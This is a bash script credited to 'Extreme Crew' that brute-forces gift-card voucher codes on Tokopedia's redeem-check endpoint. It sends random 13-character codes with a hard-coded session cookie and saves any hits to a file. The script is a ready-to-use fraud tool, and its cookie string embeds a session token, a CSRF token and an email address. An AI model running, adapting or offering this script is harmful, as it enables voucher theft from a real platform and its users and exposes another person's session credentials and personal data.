#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUyNDQ5MjE0M3xJbGw2Wmt0emQzRnFaa0pEYjNCM2JubEdPVVJOVFdKVU9HbGxPVFpJVGsxb1ZubHBTa3cyYnpka2ExVTlJZ289fHrzEHleaCRN-HumjiOEIF6aXAoFa2wyfAEau5FGUKxh; _BID_TOKOPEDIA_=270b50252c10cc87501fd0002072f346; _dc_gtm_UA-9801603-1=1; _gat_UA-9801603-1=1; insUserData=%7B%22email%22%3A%22khusnussurur%40india2in.com%22%7D; __sonar=9497248056386543448; state=eyJsZCI6Imh0dHBzOi8vYWNjb3VudHMudG9rb3BlZGlhLmNvbS90aGFua3M_dGhlbWU9ZGVmYXVsdFx1MDAyNmxkPVx1MDAyNmFjdGl2YXRpb25fdHlwZT01IiwicmVmIjoiaHR0cHM6Ly93d3cudG9rb3BlZGlhLmNvbSIsInV1aWQiOiJkNDgzMGZjZC1lNDdjLTQ4NzctYmE2MC0xNjdmYmQzYmYzZmIiLCJ0aGVtZSI6ImRlZmF1bHQifQ; scs=%7B%22t%22%3A1%7D; ins-gaSSId=dc90d58b-edac-077e-0dd5-e7880ad8a6d9_1524495685; insdrSV=3; l=1; pulsa-aff=undefined; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiZDhhMWEwNDUtOWNjOC00ZTY4LTljZTctYjkwMDVhODgwMWMwIiwiaXNfYWpheCI6dHJ1ZX0; _ga=GA1.2.410643169.1524492078; _gid=GA1.2.505457219.1524492078; _dc_gtm_UA-9801603-23=1; _uetsid=_uet463f50eb; _SID_Tokopedia_=jPaWab_K0StuKjFqKWzEsHLPlQOX2MLco6pjOKWcUbinkdvI8um6AkU6LJTXJNsCyOTrNigi7u1itd0z74Ovyt0HNOGw-O2pde8ALJ-porWlPSORdfA2CnDDrj5PL1le; _ga=GA1.3.410643169.1524492078; _gid=GA1.3.505457219.1524492078; _gat_UA-9801603-23=1; _ampSES=cf27fe1579SES6f5d5297ca9c-30798-1524492133121; _ampUITN=2acd3a8de6botc5819c5c4f04-30798-1524492133124; _ampNV=0; _ampRV=1; _ampCon=Canada; _ampCity=Montreal"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
